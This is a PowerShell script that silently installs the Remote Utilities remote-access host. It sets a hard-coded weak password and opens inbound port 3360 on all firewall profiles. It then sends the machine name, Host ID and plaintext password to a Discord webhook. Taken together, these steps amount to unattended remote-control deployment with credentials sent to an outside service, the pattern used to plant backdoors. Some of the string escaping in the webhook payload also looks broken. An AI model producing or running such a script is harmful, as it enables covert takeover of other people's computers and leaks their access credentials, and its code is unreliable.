# --------------------------------------------------------------
# Install Remote Utilities (Free) + send Host ID to Discord
# --------------------------------------------------------------

# ---- 0️⃣ USER SETTINGS -----------------------------------------
# Set your Discord webhook (you can also set the environment variable instead)
$discordWebhook = $env:RU_DISCORD_WEBHOOK `
    ?? "https://discord.com/api/webhooks/your/webhook/here"

# Simple, strong password for this host – change per machine if desired
$hostPassword = "Password123"

# URL of the free Remote Utilities installer (latest free build)
$downloadUrl = "https://www.remoteutilities.com/download/RemoteUtilities_Desktop_17_4_0.exe"

# --------------------------------------------------------------
$installerPath = "$env:TEMP\RU-Setup.exe"
$hostName      = $env:COMPUTERNAME
$hostKey       = "HKLM:\SOFTWARE\Remote Utilities\Host"
$serviceName   = "RemoteUtilitiesHost"

# 1️⃣ Download installer
Invoke-WebRequest -Uri $downloadUrl -OutFile $installerPath -UseBasicParsing

# 2️⃣ Silent install
Start-Process -FilePath $installerPath -ArgumentList "/SILENT", "/NORESTART" -Wait -NoNewWindow

# 3️⃣ Configure host (password)
if (-not (Test-Path $hostKey)) { New-Item -Path $hostKey -Force | Out-Null }
Set-ItemProperty -Path $hostKey -Name "HostName" -Value $hostName

# MD5 hash of password (Remote Utilities requirement)
$md5      = [System.Security.Cryptography.MD5]::Create()
$hashHex  = ($md5.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($hostPassword)) |
            ForEach-Object { $_.ToString("x2") }) -join ""
Set-ItemProperty -Path $hostKey -Name "PasswordEnabled" -Value 1
Set-ItemProperty -Path $hostKey -Name "PasswordMD5"      -Value $hashHex

# 4️⃣ Open firewall (port 3360)
New-NetFirewallRule -DisplayName "Remote Utilities Host" `
    -Direction Inbound -Protocol TCP -LocalPort 3360 -Action Allow -Profile Any

# 5️⃣ Start host service
Set-Service -Name $serviceName -StartupType Automatic
Start-Service -Name $serviceName

# 6️⃣ Retrieve Host ID (may need a short wait)
$hostID = (Get-ItemProperty -Path $hostKey -Name HostID -ErrorAction SilentlyContinue).HostID
if (-not $hostID) { Start-Sleep -Seconds 5; $hostID = (Get-ItemProperty -Path $hostKey -Name HostID).HostID }

# 7️⃣ Send Discord notification (optional)
if ($discordWebhook -and $hostID) {
    $payload = @{
        username = "RU‑Free‑Installer"
        embeds = @(
            @{
                title       = "Remote Utilities Host ready"
                description = "Computer **$hostName** installed."
                color       = 0x00FF00
                fields = @(
                    @{ name = "Host ID";   value = "`$hostID`"; inline = $true },
                    @{ name = "Password";  value = "`$hostPassword`"; inline = $true }
                )
                timestamp = (Get-Date).ToString('o')
            }
        )
    } | ConvertTo-Json -Depth 4

    try {
        Invoke-RestMethod -Uri $discordWebhook -Method Post -ContentType "application/json" -Body $payload
    } catch { Write-Warning "Discord post failed: $_" }
}

# 8️⃣ Clean up
Remove-Item $installerPath -Force
Write-Host "`nFree Remote Utilities installed. Host ID: $hostID"

